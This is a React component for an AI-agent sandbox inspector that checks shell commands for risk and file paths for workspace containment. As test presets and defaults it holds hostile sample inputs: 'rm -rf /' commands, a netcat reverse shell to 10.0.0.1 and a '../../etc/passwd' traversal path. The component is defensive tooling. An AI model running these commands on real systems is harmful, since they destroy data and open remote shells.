import React, { useState } from "react";
import { api } from "../api/client";
import { RiskCheckResult, PathContainmentResult } from "../types";

export const SandboxInspector: React.FC = () => {
  const [command, setCommand] = useState("rm -rf / --no-preserve-root");
  const [riskResult, setRiskResult] = useState<RiskCheckResult | null>(null);
  const [checkingCmd, setCheckingCmd] = useState(false);

  const [pathCandidate, setPathCandidate] = useState("../../etc/passwd");
  const [pathResult, setPathResult] = useState<PathContainmentResult | null>(null);
  const [checkingPath, setCheckingPath] = useState(false);

  const handleCheckCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    setCheckingCmd(true);
    try {
      const res = await api.checkCommandRisk(command);
      setRiskResult(res);
    } catch (err: any) {
      alert(`Command inspection error: ${err.message}`);
    } finally {
      setCheckingCmd(false);
    }
  };

  const handleCheckPath = async (e: React.FormEvent) => {
    e.preventDefault();
    setCheckingPath(true);
    try {
      const res = await api.checkPathContainment(pathCandidate);
      setPathResult(res);
    } catch (err: any) {
      alert(`Path inspection error: ${err.message}`);
    } finally {
      setCheckingPath(false);
    }
  };

  return (
    <div className="sandbox-inspector-container">
      {/* Command Risk Inspector */}
      <div className="card">
        <div className="section-header">
          <h2>Shell Command Safety Sandbox</h2>
          <p className="section-hint">
            Heuristic security filter classifying agent commands into SAFE, GUARDED, and PROHIBITED (blocking host deletion, fork bombs, and reverse shells).
          </p>
        </div>

        <form onSubmit={handleCheckCommand} className="form-group">
          <label>Command String to Inspect</label>
          <div className="input-with-button">
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              placeholder="e.g., git status or rm -rf /"
            />
            <button type="submit" className="btn btn-secondary" disabled={checkingCmd}>
              {checkingCmd ? "Analyzing..." : "Analyze Risk"}
            </button>
          </div>
        </form>

        <div className="preset-buttons">
          <button type="button" className="btn-preset danger" onClick={() => setCommand("rm -rf /")}>
            Prohibited: rm -rf /
          </button>
          <button type="button" className="btn-preset danger" onClick={() => setCommand("nc -e /bin/bash 10.0.0.1 4444")}>
            Prohibited: Reverse Shell
          </button>
          <button type="button" className="btn-preset warning" onClick={() => setCommand("npm install -g malicious-pkg")}>
            Guarded: npm install
          </button>
          <button type="button" className="btn-preset success" onClick={() => setCommand("pytest tests/ -v")}>
            Safe: pytest
          </button>
        </div>

        {riskResult && (
          <div className={`risk-result-card ${riskResult.riskLevel.toLowerCase()}`}>
            <div className="risk-header">
              <span className="risk-level-badge">{riskResult.riskLevel}</span>
              <span className="execution-verdict">
                {riskResult.safeToExecute ? "✓ Execution Permitted" : "✗ Execution Prohibited by Policy"}
              </span>
            </div>
            <p className="risk-reason">{riskResult.reason}</p>
            {riskResult.flaggedPatterns.length > 0 && (
              <div className="flagged-patterns">
                <strong>Flagged Patterns:</strong>
                <ul>
                  {riskResult.flaggedPatterns.map((p, i) => (
                    <li key={i}>{p}</li>
                  ))}
                </ul>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Path Containment Inspector */}
      <div className="card">
        <div className="section-header">
          <h2>Workspace Path Boundary Verifier</h2>
          <p className="section-hint">
            Verifies that file access operations are strictly contained within the authorized workspace, preventing path traversal breakout.
          </p>
        </div>

        <form onSubmit={handleCheckPath} className="form-group">
          <label>File Path to Check</label>
          <div className="input-with-button">
            <input
              type="text"
              value={pathCandidate}
              onChange={(e) => setPathCandidate(e.target.value)}
              placeholder="e.g., src/index.ts or ../../etc/passwd"
            />
            <button type="submit" className="btn btn-secondary" disabled={checkingPath}>
              {checkingPath ? "Checking..." : "Verify Path"}
            </button>
          </div>
        </form>

        {pathResult && (
          <div className={`path-result-card ${pathResult.isContained ? "contained" : "escaped"}`}>
            <div className="path-header">
              <span className="path-verdict">
                {pathResult.isContained ? "✓ Within Workspace Boundary" : "✗ Path Traversal Violation"}
              </span>
            </div>
            <div className="meta-row">
              <strong>Workspace Root:</strong> <span className="font-mono">{pathResult.workspaceRoot}</span>
            </div>
            {pathResult.isContained ? (
              <div className="meta-row">
                <strong>Canonical Path:</strong> <span className="font-mono">{pathResult.canonicalPath}</span>
              </div>
            ) : (
              <div className="error-text">{pathResult.errorMessage}</div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
